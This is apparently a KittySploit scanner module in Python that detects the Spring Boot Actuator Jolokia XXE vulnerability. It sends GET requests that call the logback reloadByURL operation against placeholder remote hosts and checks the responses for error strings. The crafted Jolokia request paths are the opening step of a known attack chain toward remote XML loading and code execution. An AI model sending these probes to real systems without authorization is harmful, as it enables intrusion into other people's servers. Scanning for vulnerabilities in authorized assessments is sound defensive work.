#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in Spring Boot Actuators's 'jolokia' endpoint allows remote attackers to perform an XML Extern."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Spring Boot Actuators (Jolokia) XXE Detection',
        'description': "A vulnerability in Spring Boot Actuators's 'jolokia' endpoint allows remote attackers to perform an XML External Entities (XXE) attack and include content stored on a remote server as if it was its own. This has the potential to allow the execution of arbitrary code and/or disclosure of sensitive information from the target machine.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'springboot', 'jolokia', 'xxe', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.veracode.com/blog/research/exploiting-spring-boot-actuators',
            'https://github.com/mpgn/Spring-Boot-Actuator-Exploit',
        ],
    }

    def run(self):
        for path in ('/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml', '/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('http:\\/\\/nonexistent:31337\\/logback.xml', 'reloadByURL', 'JoranException',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="Spring Boot Actuators (Jolokia) XXE detected",
                    path=path,
                )
                return True
        return False

